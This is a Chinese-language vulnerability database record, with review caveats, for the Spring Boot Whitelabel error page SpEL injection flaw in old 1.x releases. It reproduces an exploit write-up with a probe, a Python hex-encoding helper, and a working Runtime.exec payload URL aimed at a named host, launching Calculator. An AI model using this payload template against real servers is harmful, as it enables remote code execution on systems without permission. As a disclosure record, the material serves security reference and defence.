---
source: "hatch 补库批 20260928"
product: "Spring Boot旧Whitelabel SpEL"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Spring Boot whitelabel error page SpEL rce"
prerequisites: "来源所述条件，未列明部分仍待核：1.1.0–1.1.12、1.2.0–1.2.7、1.3.0，需官方修复依据及开发分支限定"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-2f63faef758b7dc76b21cfdf"
entity_id: "ve-2f63faef758b7dc76b21cfdf"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：1.1.0–1.1.12、1.2.0–1.2.7、1.3.0，需官方修复依据及开发分支限定

代码与实验材料：正常请求→错误反射→算术→命令文本完整，无项目或响应结果；错误页存在不够需输入进入可解析错误信息

来源证据范围：导入批无原研究或官方公告

- **代码与转录边界（1）**：前提不能简化为知道错误页参数；依据：必须特定旧实现及错误信息反射可控字符串；任意500/Whitelabel不是存在SpEL证据。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（2）**：版本修复与运行平台缺说明；依据：无安全版本、命令macOS Calculator，原始URL含大括号等需编码，目标域名未占位。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Boot whitelabel error page SpEL rce

一、漏洞简介
------------

### 利用条件

-   至少知道一个触发 springboot 默认错误页面的接口及参数名

二、漏洞影响
------------

spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0

三、复现过程
------------

#### 漏洞原理：

1.  spring boot 处理参数值出错，流程进入
    `org.springframework.util.PropertyPlaceholderHelper` 类中
2.  此时 URL 中的参数值会用 `parseStringValue` 方法进行递归解析
3.  其中 `${}` 包围的内容都会被
    `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration`
    类的 `resolvePlaceholder` 方法当作 SpEL 表达式被解析执行，造成 RCE
    漏洞

### 漏洞复现

##### 步骤一：找到一个正常传参处

比如发现访问 `/article?id=xxx` ，页面会报状态码为 500 的错误：
`Whitelabel Error Page`，则后续 payload 都将会在参数 id 处尝试。

##### 步骤二：执行 SpEL 表达式

输入 `/article?id=${7*7}` ，如果发现报错页面将 7\*7 的值 49
计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。

由字符串格式转换成 `0x**` java 字节形式，方便执行任意代码：

    # coding: utf-8

    result = ""
    target = 'open -a Calculator'
    for x in target:
        result += hex(ord(x)) + ","
    print(result.rstrip(','))

执行 `open -a Calculator` 命令

    ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}

正常访问：

    http://www.0-sec.org:9091/article?id=66

执行 `open -a Calculator` 命令：

    http://www.0-sec.org:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
